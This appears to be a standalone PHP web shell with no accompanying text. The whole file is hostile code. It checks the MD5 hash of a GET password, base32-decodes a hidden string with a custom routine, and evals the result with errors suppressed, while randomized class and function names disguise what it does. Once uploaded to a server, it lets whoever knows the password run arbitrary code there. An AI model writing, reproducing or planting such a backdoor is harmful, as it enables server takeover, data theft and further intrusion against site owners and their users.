<?php
class YGEB{
        public $ZLGC = null;
        public $IZKN = null;
        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
        $this->ZLGC = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->IZKN = @GSFX($this->ZLGC);
        @eval("/*Sl_eFdQ*/".$this->IZKN."/*Sl_eFdQ*/");
        }}}
new YGEB();
function XNGR($WIXS){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $RYWD = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($WIXS); $i < $j; $i++){
    $v <<= 8;
        $v += ord($WIXS[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $RYWD .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $RYWD .= $BASE32_ALPHABET[$v];}
    return $RYWD;}
function GSFX($WIXS){
    $RYWD = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($WIXS); $i < $j; $i++){
        $v <<= 5;
        if ($WIXS[$i] >= 'a' && $WIXS[$i] <= 'z'){
            $v += (ord($WIXS[$i]) - 97);
        } elseif ($WIXS[$i] >= '2' && $WIXS[$i] <= '7') {
            $v += (24 + $WIXS[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $RYWD .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $RYWD;}
?>